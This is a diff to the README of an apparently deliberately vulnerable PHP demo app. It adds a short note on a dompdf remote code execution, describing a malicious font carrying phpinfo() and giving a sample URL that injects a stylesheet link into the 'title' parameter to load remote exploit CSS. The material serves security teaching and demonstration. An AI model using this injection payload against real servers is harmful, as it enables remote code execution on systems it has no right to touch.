@@ -64,4 +64,12 @@ To run click the email icon next to a line entry to send an email reminder.
 
 Note: No emails will actually send or are being stored, only validating the email address entered into the input using the PHPMailer library. 
 
+### dompdf remote code execution 
 
+font called gotcha with phpinfo() in the meta data copyright
+
+css references the server location (add a git path)
+
+```
+http://localhost:8000/index.php?pdf&title=<link rel=stylesheet href='https://raw.githubusercontent.com/snyk-labs/php-goof/main/exploits/gotcha.css'>
+```
